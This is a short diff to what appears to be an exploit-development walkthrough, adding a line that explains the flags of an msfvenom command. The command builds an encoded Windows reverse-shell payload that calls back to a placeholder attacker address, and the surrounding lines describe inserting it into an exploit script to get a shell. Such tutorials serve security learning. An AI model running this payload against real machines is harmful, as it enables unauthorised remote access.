@@ -51,5 +51,6 @@ We can now generator our payload to run against our victim machine inserting the
 `msfvenom -p windows/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a"`
 
 The `EXITFUNC=thread` prevents the shellcode from crashing the application when executing our shellcode.
+`-f c` is for file type which is this case is C. `-e x86/shikata_ga_nai` is for the encoding which we use shikata_ga_nai for. `-b "\x00\x0a"` is voor specifying the badchars.
 
 Now just insert the out in the `exploit.py` script and run it against the application to get a reverse shell. Dont forget to open a listener!
